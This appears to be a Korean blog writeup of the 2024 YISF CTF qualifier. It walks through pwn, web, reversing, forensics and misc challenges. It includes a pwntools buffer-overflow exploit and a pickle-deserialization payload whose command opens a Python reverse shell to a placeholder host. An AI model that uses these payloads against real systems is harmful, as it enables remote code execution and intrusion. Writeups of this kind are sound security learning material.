---
title: 2024 YISF Qual Writeup
description: "Writeup about [ yisfVM, webcome, take_your_flag, ViroFlux, DONT'T TOUCH ME!!, [시나리오 0] 침해사고 의뢰, Flagcut, phoneTICgrief ]"
date: 2024-08-12 12:30:00 +0900
categories: [CTF, YISF]
tags: [pwn, web, rev, forensics, ir, misc]
image: 
  path: /assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/81d9ad37e896e0c3517ed95ba9b4d358.png
  alt: 청소년부 고수들이 다 데프콘에 가서 운이 좋게도 예선 1등을 하였다.
---

## PWN
### 1. yisfVM
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/1f508906495b794c281c40303787b2f5.png)
```c
// main.c

// gcc -o yisfvm main.c vm.c -fno-stack-protector -no-pie -z relro

# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>
# include "vm.h"

void win() {
    char *argv[] = { "/bin/sh", "-c", "cat flag", NULL };
    execve("/bin/sh", argv, NULL);
}

void initialize(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main(){
    initialize();
    VM vm;
    init_vm(&vm);

    unsigned char program[PROGRAM_SIZE] = "\x00";
    char input[PROGRAM_SIZE * 2 + 1];
    int program_size = 0;
    
    printf("Enter your program: \n");
    if (fgets(input, sizeof(input), stdin) == NULL){
        printf("Error reading input\n");
        return 1;
    }

    size_t len = strlen(input);
    if (input[len -1] == '\n'){
        input[len-1] = '\0';
        len--;
    }

    for (size_t i = 0; i < len; i += 2){
        unsigned int byte;
        sscanf(&input[i], "%2x", &byte);
        program[program_size++] = (unsigned char)byte;
        if (program_size >= PROGRAM_SIZE) break;
    }
    execute(&vm, program, sizeof(program));
    
    printf("Result: %d\n", vm.stack[vm.sp]);
    return 0;
}
```
```c
// vm.c

#include "vm.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void init_vm(VM *vm) {
    vm->ip = 0;
    vm->sp = -1;
    memset(vm->stack, 0, sizeof(vm->stack));
    memset(vm->memory, 0, sizeof(vm->memory));
}

void execute(VM *vm, unsigned char *program, int program_size) {
    while (vm->ip < program_size) {
        switch (program[vm->ip]) {        
            case OP_NOP:
                vm->ip += 1;
                break;

            case OP_PUSH:
                vm->ip++;
                if (vm->sp < STACK_SIZE - 1) {
                    unsigned int value = program[vm->ip];
                    vm->stack[++vm->sp] = value;
                    vm->ip += 1;            
                } else {
                    printf("Stack Overflow Detected!\n");
                    exit(1);
                }
                break;

            case OP_POP:
                if (vm->sp >= 0) {
                    vm->sp--;
                } else {
                    printf("Stack Underflow Detected!\n");
                    exit(1);
                }
                vm->ip += 1;
                break;

            case OP_SWAP:
                if (vm->sp >= 0 && vm->sp < STACK_SIZE) {
                    int off = program[vm->ip + 1];
                    if (vm->sp - off >= 0) {
                        int temp = vm->stack[vm->sp];
                        vm->stack[vm->sp] = vm->stack[vm->sp - off];
                        vm->stack[vm->sp - off] = temp;
                    } else { 
                        printf("Invalid SWAP operation\n");
                        exit(1);
                    }
                } else {
                    printf("Stack Overflow Detected!\n");
                    exit(1);
                }
                vm->ip += 2;
                break;

            case OP_ADD: 
                if (vm->sp >= 1) {
                    unsigned int b = vm->stack[vm->sp--];
                    unsigned int a = vm->stack[vm->sp];                
                    vm->stack[vm->sp] = a + b;
                } else {
                    printf("Not enough values on the stack for ADD!\n");
                    exit(1);
                }
                vm->ip += 1;
                break;
    
            case OP_SUB: 
                if (vm->sp >= 1) {
                    unsigned int b = vm->stack[vm->sp--];
                    unsigned int a = vm->stack[vm->sp];
                    vm->stack[vm->sp] = a - b;                   
                } else {
                    printf("Not enough values on the stack for SUB!\n");
                    exit(1);
                }
                vm->ip += 1;
                break;
            
            case OP_MUL: 
                if (vm->sp >= 1) {
                    unsigned int b = vm->stack[vm->sp--];
                    unsigned int a = vm->stack[vm->sp];
                    vm->stack[vm->sp] = a * b;
                } else {
                    printf("Not enough values on the stack for MUL!\n");
                    exit(1);
                }
                vm->ip += 1;
                break;                
            
            case OP_DIV: 
                if (vm->sp >= 1) {
                    unsigned int b = vm->stack[vm->sp--];
                    unsigned int a = vm->stack[vm->sp];
                    if (b != 0) {
                        vm->stack[vm->sp] = a / b;
                    } else {
                        printf("Division by zero!\n");
                        exit(1);
                    }   
                } else {
                    printf("Not enough values on the stack for DIV!\n");
                    exit(1);
                }
                vm->ip += 1;
                break;

            case OP_INPUT:
                if (vm->sp >= 0) {
                    int size = vm->stack[vm->sp];
                    if (size >= 0 || size <= MEMORY_SIZE) { // vuln
                        printf("Enter %d bytes of input: ", size);
                        if (fread(vm->memory, 1, size, stdin) != size) {
                            printf("Error reading input\n");
                            exit(1);
                        }
                    } else {
                        printf("Invalid input size\n");
                        exit(1);
                    }
                } else { 
                    printf("Stack underflow for INPUT\n");
                    exit(1);
                }
                vm->ip += 1;
                break;

            case OP_PRINT_STACK:
                printf("Stack state: ");
                for (int i = 0; i <= vm->sp; i++) {
                    printf("%02x ", vm->stack[i]);
                }
                vm->ip += 1;
                break;

            case OP_HALT:
                return;

            default:
                printf("Unknown instruction: %x\n", program[vm->ip]);
                exit(1);
        }
    }
}

```
```c
// vm.h

#ifndef VM_H
#define VM_H

#define STACK_SIZE 256
#define MEMORY_SIZE 1024
#define PROGRAM_SIZE 256

typedef struct {
    int ip; // instruction pointer
    int sp; // stack pointer
    int stack[STACK_SIZE];
    unsigned char memory[MEMORY_SIZE];
} VM;

void init_vm(VM *vm);
void execute(VM *vm, unsigned char *program, int program_size);

# define OP_NOP         0x00
# define OP_PUSH        0x01
# define OP_POP         0x02
# define OP_SWAP        0x03
# define OP_ADD         0x04
# define OP_SUB         0x05   
# define OP_MUL         0x06
# define OP_DIV         0x07
# define OP_INPUT       0x08
# define OP_PRINT_STACK 0x09
# define OP_HALT        0x0A

#endif // VM_H
```
위와 같은 소스코드 파일이 주어진다. 
```c
case OP_INPUT:
	if (vm->sp >= 0) {
		int size = vm->stack[vm->sp];
		if (size >= 0 || size <= MEMORY_SIZE) { // vuln
			printf("Enter %d bytes of input: ", size);
			if (fread(vm->memory, 1, size, stdin) != size) {
				printf("Error reading input\n");
				exit(1);
			}
		} else {
			printf("Invalid input size\n");
			exit(1);
		}
	} else { 
		printf("Stack underflow for INPUT\n");
		exit(1);
	}
```
코드를 분석하면 `OP_INPUT`에서 올바르지 않은 비교 연산자를 사용하여 BOF가 발생한다는 것을 알 수 있다. 이를 통해 익스플로잇 코드를 작성하면 아래와 같다.
```python
# solve.py

from pwn import *

# p = process("./yisfvm", level="debug")
p = remote("211.229.232.101", port=50001,level="debug")

win = 0x0000000000401256

# pause()

p.recvuntil(b"Enter your program: \n")

OP_NOP = "00"
OP_PUSH =       "01"
OP_POP   =      "02"
OP_SWAP   =     "03"
OP_ADD     =    "04"
OP_SUB      =   "05"
OP_MUL       =  "06"
OP_DIV        = "07"
OP_INPUT       ="08"
OP_PRINT_STACK ="09"
OP_HALT        ="10"

payload = f"{OP_PUSH}".encode() * 4
payload += f"{OP_ADD}".encode()
payload += f"{OP_PUSH}".encode()
payload += f"{OP_MUL}".encode() * 2
payload += f"{OP_PUSH}".encode() *2
payload += f"{OP_ADD}".encode()
payload += f"{OP_PUSH}".encode()
payload += f"{OP_MUL}".encode() * 2
payload += f"{OP_PUSH}".encode() *2
payload += f"{OP_ADD}".encode()
payload += f"{OP_PUSH}".encode()
payload += f"{OP_MUL}".encode() * 2
payload += f"{OP_PUSH}".encode() *2
payload += f"{OP_ADD}".encode()
payload += f"{OP_PUSH}".encode()
payload += f"{OP_MUL}".encode() * 2
payload += f"{OP_PUSH}".encode() *4
payload += f"{OP_ADD}".encode()
payload += f"{OP_DIV}".encode()
payload += f"{OP_INPUT}".encode()

p.sendline(payload)

p.recvuntil(b"input: ")
payload2 = b"A"*1024
payload2 += p64(win)*50
p.sendline(payload2)


p.interactive()
```
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/ddb9edd5aaa16e21903da78fd5002e1b.png)

FLAG: `YISF{7h15_15_v3ry_345y_vm_b0f}`
## WEB
### 1. webcome
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/9f6b9de1a5fd75f870c6e91e04f7ec1e.png)
```python
# app.py


from flask import Flask, request, render_template, make_response
import os, pickle, base64
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
app.secret_key = os.urandom(32)
AES_KEY = "[[REDIRECTION]]"

logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[logging.StreamHandler()])

logger = logging.getLogger(__name__)


INFO = ['name', 'userid', 'password']

def encrypt(data):
    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

def decrypt(data):
    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
    return unpad(cipher.decrypt(data), AES.block_size)


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create_vsession', methods=['GET', 'POST'])
def create_vsession():
    if request.method == 'GET':
        return render_template('create_vsession.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        try:
            data = base64.b64encode(encrypt(pickle.dumps(info))).decode('utf8')
            return render_template('create_vsession.html', data=data)
        except:
            return "wrong!"
    else:
        return "wrong"

@app.route('/check_vsession', methods=['GET', 'POST'])
def check_vsession():
    if request.method == 'GET':
        return render_template('check_vsession.html')
    elif request.method == 'POST':
        try:
            vsession = request.form.get('session', '')
            info = pickle.loads(decrypt(base64.b64decode(vsession)))
            logger.info(f"아이피 {request.remote_addr}가 check_session을 시도함. {info}")
            res = make_response(render_template('check_vsession.html', info=info))
            res.headers.set('X-AES-KEY', f"{AES_KEY}")
            return res
        except:
            return "wrong"
    else:
        return "wrong"

app.run(host='0.0.0.0', port=8000)
```
코드를 살펴보면 AES encrypt을 통해 pickle dump와 load가 이루어진다.
```python
res.headers.set('X-AES-KEY', f"{AES_KEY}")
```
근데 위 코드를 보면 AES_KEY를 헤더로 유출하고 있으므로, 내가 원하는 info 변수를 만들 수 있다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/02d37b84ec38d48982c01f4e9f5bea34.png)

AES KEY를 구한 뒤 pickle deserialization 취약점을 이용하여 RCE를 진행한다. 전체적인 익스플로잇 코드는 아래와 같다.
```python
import pickle, os, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

AES_KEY = "36f6d9a966c4478c73af4fde2f813212"

def encrypt(data):
    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

def decrypt(data):
    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
    return unpad(cipher.decrypt(data), AES.block_size)

class RCE:
    def __reduce__(self):
        cmd = ('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
        return os.system, (cmd,)

payload = base64.b64encode(encrypt(pickle.dumps(RCE()))).decode('utf8')
print(payload)
```
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/f06160e3548e2777c2d1cbc394898e42.png)

FLAG: `YISF{webCOme_T0_7He_h4CK1ng_wEbCOM3}`
## REV
### 1. take_your_flag
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/a694b5d928a5f7792217be8c78891892.png)
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/1ec09d09b60796bc74edb4fcd4c60aef.png)
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/c6ff84882c28d3b029066d1b0f7094aa.png)
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/62569e8223e9af3e1b41d59732ddc684.png)

`sub_1499`함수에서 연산한 값이 `dword_4020 + 4 * i`와 같으면 된다는 것이다. 역연산 코드를 짜면 아래와 같다.
```python
def reverse_sub_1499(target, shift):
    # Right shift the target value by shift bits and left shift by (8 - shift) bits, then combine them
    # Ensure to use only the lower 8 bits by subtracting 0x100 if needed
    original = ((target << (8 - shift)) | (target >> shift)) & 0xff
    
    # Correct for the bit shift using 0x100
    return original

def sub_1449(target, shift):
    original = ((target) << shift) | ((target) >> (8 - shift))
    # Mask to ensure we are within the bounds of an unsigned 8-bit integer
    # original &= 0xFF
    return original

# Given dword_4020 values
dword_4020 = [
    0xc4, 0x95, 0x83, 0xc4, 0x7d, 0x99, 0xc4, 0xd0, 0x9d, 0x7d, 0xd4, 0xa5,
    0xc4, 0xcd, 0x7d, 0xc4, 0xcd, 0xb2, 0xe5, 0x7d, 0xa4, 0xbd, 0xad, 0x95,
    0x7d, 0xa8, 0xd0, 0xa1, 0xd0, 0x7d, 0xd3, 0xd0, 0xad, 0xc8, 0x7d, 0x99,
    0xc4, 0x85, 0x9d, 0x00
]


# dword_4020 = [0x99, 0x85, 0xad, 0x95, 0x7d, 0xb1, 0xbd, 0xd9, 0x95, 0x7d, 0x99, 0x85, 0xad, 0x95, 0x7d, 0xb1, 0xbd, 0xd9, 0x95, 0x7d, 0x99, 0x85, 0xad, 0x95, 0x7d, 0xb1, 0xbd, 0xd9, 0x95]

shift = 2
input_chars = []

# Compute the original input characters from the dword_4020 values
for value in dword_4020:
    input_char = reverse_sub_1499(value, shift)
    print(hex(sub_1449(input_char, 2)),end=' ')
    input_chars.append(input_char)

# Convert to string
input_string = ''.join(chr(c) for c in input_chars if c != 0)  # Ignore null terminator

print("\nCalculated Input:", input_string)
# print(list(map(hex,input_chars)))
```
근데 이 익스플로잇 코드를 돌리게 되면 이상한 문자도 섞여서 나온다. 원인을 찾기 위해 다시 분석하였다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/00a524d943914372647536a6a2e1b290.png)

위와같이 추가 연산 작업이 있었고, 이를 적용해 주었다.
최종 익스플로잇은 다음과 같다.
```python
def reverse_sub_1499(target, shift):
    # Right shift the target value by shift bits and left shift by (8 - shift) bits, then combine them
    # Ensure to use only the lower 8 bits by subtracting 0x100 if needed
    original = ((target << (8 - shift)) | (target >> shift)) & 0xff
    
    # Correct for the bit shift using 0x100
    return original

def sub_1449(target, shift):
    original = ((target) << shift) | ((target) >> (8 - shift))
    # Mask to ensure we are within the bounds of an unsigned 8-bit integer
    # original &= 0xFF
    return original

# Given dword_4020 values
dword_4020 = [
    0xc4, 0x95, 0x83, 0xc4, 0x7d, 0x99, 0xc4, 0xd0, 0x9d, 0x7d, 0xd4, 0xa5,
    0xc4, 0xcd, 0x7d, 0xc4, 0xcd, 0xb2, 0xe5, 0x7d, 0xa4, 0xbd, 0xad, 0x95,
    0x7d, 0xa8, 0xd0, 0xa1, 0xd0, 0x7d, 0xd3, 0xd0, 0xad, 0xc8, 0x7d, 0x99,
    0xc4, 0x85, 0x9d, 0x00
]

dword_4020[0] += 5
dword_4020[2] += 2
dword_4020[10] -= 3
dword_4020[11] -= 4
dword_4020[17] += 3
dword_4020[20] += 5
dword_4020[25] -= 7
dword_4020[30] -= 2
# dword_4020 = [0x99, 0x85, 0xad, 0x95, 0x7d, 0xb1, 0xbd, 0xd9, 0x95, 0x7d, 0x99, 0x85, 0xad, 0x95, 0x7d, 0xb1, 0xbd, 0xd9, 0x95, 0x7d, 0x99, 0x85, 0xad, 0x95, 0x7d, 0xb1, 0xbd, 0xd9, 0x95]

shift = 2
input_chars = []

# Compute the original input characters from the dword_4020 values
for value in dword_4020:
    input_char = reverse_sub_1499(value, shift)
    # print(hex(sub_1449(input_char, 2)),end=' ')
    input_chars.append(input_char)

# Convert to string
input_string = ''.join(chr(c) for c in input_chars if c != 0)  # Ignore null terminator

print("\nCalculated Input:", input_string)
# print(list(map(hex,input_chars)))


```
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/da84a8ff522f60b8114430e99f263df5.png)

FLAG: `YISF{rea1_f14g_th1s_1smy_joke_h4h4_t4k2_f1ag}`
### 2. ViroFluX
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/84cfb68be099d6f7f1f496f9587c027e.png)
YISF CTF에 매년 빠지지 않고 등장하는 Unity Game 리버싱이다. 항상 풀 때마다 재밌다.(운영진 여러분 감사합니다.)
이번 문제는 지금까지 YISF CTF에서 출제되었던 게임 리버싱 문제들보다 개인적으로 조금 어려웠다. (수정할게 많아서 그런가)
암튼 게임 리버싱의 첫번째 기본은 dnspy, cheat engine이다. 게임을 먼저 켜서 어떤 게임인지 살펴보았다. 점수를 주는 몹과 점수를 잃게 만드는 몹이 있는데 다음 스테이지 돌파를 위한 점수를 몹을 처리하면서 만들면 되는 게임이었다.

dnspy를 열어 `[GAME 설치 위치]/[GAME_NAME]_Data/Managed/Assembly-CSharp.dll`파일을 열어주었다. 게임을 하면서 필요한 부분 적절히 코드 수정해주었다.

![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/7252d738e904e3c7e4785a326bf176c4.png)

Target 체크 루틴을 지우고, 체크를 다 수행하면 실행하는 코드 부분만 남겼다
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/f987cb7c731fc224eab036186659ddb3.png)

점수 체크 루틴도 위와 동일하게 수행해준다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/9339be0ea27bd4909d94821e49ca04ee.png)

죽으면 부활하는 몹도 맨 아래 `base.gameObject.SetActive(false);`로 부활을 하지 못하도록 수정한다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/beec947f7a86d343eb385f0dbca2ab5b.png)

체력이 엄청 많은 몹도 상대할 수 있도록 데미지를 엄청 높여준다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/052e57b292a4b836f839be8bb18145e9.png)

점프를 높게 뛰어주도록 만들어 준다.

위와 같이 모두 수정을 해주었으면, Save all하고 게임을 실행하여서 모든 Key를 먹고(모든 key를 안먹으면 fake flag가 나오는 것 같다.) Flag stage에 들어가면 된다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/1aa2e47790f2d5b983030b370f647648.png)

무시무시한 놈 죽이고
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/502056d94877ff312e033776256ba29b.png)

더 무시무시한 놈 죽이고
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/f06bc4a194152b50536bc6e51af6528c.png)

죽으면 부활하는 놈(이젠 아님 ㅋ) 죽이고
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/b296da153931b5ef127edb5c0549d708.png)

악랄하게 올려놓은 KEY 먹어주고
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/afd61fe09b3a5c5058d030de7e94275f.png)

마지막으로 Flag Portal을 타고 들어가면
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/e95b04a5130b848ddf76db9f8e11f03e.png)

FLAG가 나온다.

FLAG: `YISF{v4Cc1N3s_AtC_CoDe_J07bB}`
## FOR
### 1. DON'T TOUCH ME!!
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/6ef6284ab01c77c9734cdc51c1fd3d22.png)
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/b0210f6692d730b67a25940b9034c516.png)

주어진 Hint을 보면, 이메일 포렌식을 해야한다는 방향성을 잡을 수 있다. 
이메일 아티팩트의 위치는 `Users\[User name]\AppData\Local\Microsoft\Outlook`에 ost파일이나 pst파일이 있다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/e97fc484b624050fb8dbb664ecf1ce6c.png)

이 ost 파일을 Extract 해주고, Kernel OST viewer를 이용하여 이메일을 보았다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/207f0caf501acfecfbfd94778f479d92.png)

삭제된 메일함에 gdp030112@gmail.com로 보낸 메일을 확인할 수 있었고, 이 Attached된 이미지를 추출하였다. 그리고 이 이미지는 그냥 주어진게 아니란 걸 추측할 수 있다. 바로 Hxd Editor에 올리자. JPG의 Signiture footer FF D9를 조회하면 jpg 파일 다음에 PK...가 이어지는 걸 봐서 ZIP파일이 존재한다는 것을 알 수 있다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/813ff18cfcf0dccda3f2f518dd5a48b8.png)

ZIP파일을 뽑아내어서 압축을 해제하면 donttouchme.txt 파일이 나오는데, 알 수 없는 문자열로 이루어져있다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/1d40ee8ac26db671bc860b488f49307c.png)

처음엔 이게 잘 뭔지 몰라서 jpg 파일도 함께 뽑아주었다. jpg 속성->자세히->설명에 알 수없는 영문이 있었고, 이게 Key값인 것 같았다. 
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/b7c627bd23c0835b208fb412cab82d96.png)

처음에는 passphrase를 사용하는 steghide를 사용해서 jpg에 뭔가 메시지를 숨겼나? 라고 생각을 했지만 steghide가 작동하지 않았었다. 이 설명이 그냥 주어진 것은 아닐텐데라고 생각하고 계속 고민하다가 혹시나 하고 veracrypt에 넣어보았다. 운이 좋게도, 마운트가 되었다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/c136fb3d8eef511df29bdc201b8f3686.png)

그 후 마운트 된 디스크에 flag.png가 존재했고, flag.png을 열면 플래그가 나온다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/88a6869e9e4cfc4b7acaa21393a1e1dc.png)
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/3d457d02f17deecf19606ba40ed24e14.png)

FLAG: `YISF{oH,_you_C@uGht_m3..,,,OTL}`

## IR
### 1. \[시나리오 0\] 침해사고 의뢰
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/cb0435feb2af6cc7975857f5052e5458.png)

이 문제는 기본으로 주어지는 문제고, 나머지 3문제가 있는데 잠깐 살펴보고 안풀었다. 아니 못풀었다.
\[시나리오 0\]의 플래그는 문제 파일 md5 해시만 입력하면 된다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/af15b0304d2621d31217613d94b95fd5.png)

FLAG: `f292aeb00c9144daa9280b3a17857f06`
## MISC
### 1. Flagcut
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/7e131e6570aa870e63440d80e8ee9a62.png)
```python
# prob.py
assert len(flag := open('flag', 'rb').read()) == 28
assert (mod := int(input())) < 200
print(int.from_bytes(flag, 'big') % mod)
```
위와 같은 코드로 문제 서버가 돌아간다. 바로 CHATGPT한테 물어보았다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/cd08e6a97e4347047aecf77a1170ee81.png)
```python
# solve.py

from pwn import *
# flag 값의 길이는 28바이트로 고정되어 있습니다.
flag_length = 28

# ASCII 값을 통해 알려진 부분을 byte 값으로 변환합니다.
known_prefix = b'YISF{'
known_suffix = b'}'
unknown_length = flag_length - len(known_prefix) - len(known_suffix)

# flag의 미지의 부분을 임의의 값으로 초기화합니다.
partial_flag = bytearray(flag_length)
partial_flag[:len(known_prefix)] = known_prefix
partial_flag[-len(known_suffix):] = known_suffix

# 200 미만의 숫자들을 모두 시도합니다.
results = {}
for mod in range(1, 200):
    p = remote("211.229.232.101",22111)
    p.sendline(f"{mod}".encode())
    recv = p.recvline().strip().decode()
    result = int(recv)
    results[mod] = result

# 주어진 mod와 결과값을 이용하여 flag 값을 유추합니다.
from sympy.ntheory.modular import crt

mods = list(results.keys())
remainders = list(results.values())

# 중국인의 나머지 정리를 이용하여 flag 값을 복원합니다.
flag_value, _ = crt(mods, remainders)

# 복원된 flag 값을 바이트 배열로 변환합니다.
flag_bytes = flag_value.to_bytes(flag_length, 'big')

# known_prefix와 known_suffix를 검증합니다.
if flag_bytes.startswith(known_prefix) and flag_bytes.endswith(known_suffix):
    print(f'복원된 flag 값: {flag_bytes.decode()}')
else:
    print('복원된 값이 조건을 만족하지 않습니다.')

```
CHATGPT가 던져준 코드를 적절히 수정해서 돌리면 플래그가 나온다.
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/8bd013edbe86d85a3be670932be87fd2.png)

FLAG: `YISF{cutcutcut_flagflagfalg}`

### 2. phoneTICgrief
---
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/b95fff93b5ad0e06ef7a0c87d01100fe.png)
![](/assets/posts_attached/2024-08-11-2024-YISF-Qual-Writeup/bc7d0ee34ee2f3ad716b59b05fac3225.png)

위 이미지와 같은 문자열이 주어지고 phonetic alphabet이 주어진다.
```json
// code.json
{
    "A": "Alfa", "B": "Bravo", "C": "Charlie", "D": "Delta", "E": "Echo",
    "F": "Foxtrot", "G": "Golf", "H": "Hotel", "I": "India", "J": "Juliett",
    "K": "Kilo", "L": "Linux", "M": "Mike", "N": "November", "O": "Oscar",
    "P": "Papa", "Q": "Quebec", "R": "Romeo", "S": "Sierra", "T": "Tango",
    "U": "Uniform", "V": "Victor", "W": "Whiskey", "X": "Xray", "Y": "Yankee",
    "Z": "Zulu"
}
```
처음에는 뭔지 몰라서 구글링 하다가, 2023 X-mas CTF Writeup에 위와 같은 비슷한 문제가 있었다. NATO phonetic alphabet을 S로 치환해주는 json을 만들고, 익스플로잇 코드를 짜면 된다.
```python
nato = {
    "A": "Alfa", "B": "Bravo", "C": "Charlie", "D": "Delta", "E": "Echo",
    "F": "Foxtrot", "G": "Golf", "H": "Hotel", "I": "India", "J": "Juliett",
    "K": "Kilo", "L": "Linux", "M": "Mike", "N": "November", "O": "Oscar",
    "P": "Papa", "Q": "Quebec", "R": "Romeo", "S": "Sierra", "T": "Tango",
    "U": "Uniform", "V": "Victor", "W": "Whiskey", "X": "Xray", "Y": "Yankee",
    "Z": "Zulu"
}
nato_inverse = { v.upper():k for k, v in nato.items() }
# print(nato_inverse)
result = {}
for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
    n = nato[c].upper()
    res = []
    for k in n:
        # res.append(nato[k].upper())                
        res.append('S' * len(nato[k]))
    result[' '.join(res)] = c # L, M duplicate


import json
json.dump(result, open('result2.json', 'w'), indent=4)

tmp = cipher.split('  ')
for i in tmp:
    print(result[i],end='')
```
그리고 나온 결과 값을 [online phonetic alphabet decoder](https://www.dcode.fr/nato-phonetic-alphabet)을 이용해서 평문을 구한다.
```
HELLOMYNAMEISCHERRYIREALLYLIKEOMURICEINFACTMYBIRTHDAYISONAUGUST8EENTHANDONTHATDAYIALWAYSMAKESURETOEATOMURICEISTILLREMEMBERTHEFIRSTDAYITRIEDOMURICESINCETHENOMURICEHASBECOMEMYFAVORITEFOODINMYLIFEWHENAUGUST8EENTHCOMESAROUNDSPENDINGTIMEWITHMYFAMILYANDEATINGOMURICEBRINGSMETHEGREATESTHAPPINESSANDTHEFLAGREMEMBERMYBIRTHDAYHOLDSVERYIMPORTANTMEANINGAMONGMYFRIENDSANDMESOTHEFLAGISREMEMBERMYBIRTHDAYIFMYFRIENDSREMEMBERMYBIRTHDAYITMAKESTHEDAYSPECIALCELEBRATINGMYBIRTHDAYWHILEEATINGOMURICEISTHEBESTGIFTFORMEBYTHEWAYIDISLIKECHEESEIDONTPARTICULARLYLIKEFOODSTHATCONTAINCHEESEBUTILOVEOMURICEWITHOUTEXCEPTIONTHEFLAGISREMEMBERMYBIRTHDAY
```
위와 같은 결과 값이 나오고, 마지막에 FLAGISREMEBETMYBIRTHDAY라고 나와있다.
FLAG: `YISF{remember_my_birthday}`
